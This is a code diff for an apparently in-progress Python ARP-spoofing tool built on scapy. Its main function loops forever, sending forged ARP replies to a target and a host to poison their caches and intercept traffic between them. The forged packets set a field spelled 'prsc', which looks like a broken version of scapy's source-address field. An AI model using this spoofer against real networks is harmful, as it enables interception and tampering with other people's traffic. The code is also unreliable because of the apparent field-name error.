@@ -1,53 +1,62 @@
-import re
+import sys
 import time
-import socket
-import subprocess
 import scapy.all as scapy
+from rich import print
 
+from services import get_mac
 
 """
 ----  TO DO:  ----
 def restore_cache();
+def enable_ip_route();
 main loop;
 """
 
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    request = ether_frame/arp_request
+def ScapyArpSpoofer(target, host, verbose):
 
-    response_list = scapy.srp(request, timeout=5, retry=1, verbose=False)[0]
+    def get_default_gateway():
+        try:
+            """sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.connect(('8.8.8.8', 80))
+            gateway_ip = sock.getsockname()
+            print(gateway_ip)
+            sock.close()"""
 
-    return response_list[0][1].hwsrc
+            """ipconfig = subprocess.check_output("ipconfig")
+            print(ipconfig)
+            default_gateway = re.findall("Gateway", ipconfig)
+            print(default_gateway)"""
+
+            gw = scapy.conf.route.route("0.0.0.0")[2]
+            print(gw)
+
+            return gw
+        
+        except Exception as e:
+            print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
 
 
-def get_gateway():
+    def spoofer(target, host):
+        packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), prsc=host)
+        
+        scapy.send(packet, verbose=False)
+
     try:
-        """sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.connect(('8.8.8.8', 80))
-        gateway_ip = sock.getsockname()
-        print(gateway_ip)
-        sock.close()"""
+        packets_count = 0
+        while True:
+            spoofer(target, host)
+            spoofer(host, target)
 
-        """ipconfig = subprocess.check_output("ipconfig")
-        print(ipconfig)
-        default_gateway = re.findall("Gateway", ipconfig)
-        print(default_gateway)"""
-
-        gw = scapy.conf.route.route("0.0.0.0")[2]
-        print(gw)
-
-        return gw
+            packets_count = packets_count + 2
+            print(f"Packets sent: {packets_count}")
+            time.sleep(1)
     
+    except KeyboardInterrupt:
+        sys.exit()
+
     except Exception as e:
-        print(str(e))
-
-
-def spoofer(target, gateway):
-    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), prsc=gateway)
-    scapy.send(packet, verbose=False)
-
-
+        print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
+        sys.exit(1)
 
 if __name__ == '__main__':
-    get_gateway()
+    print(get_mac("192.168.5.132"))
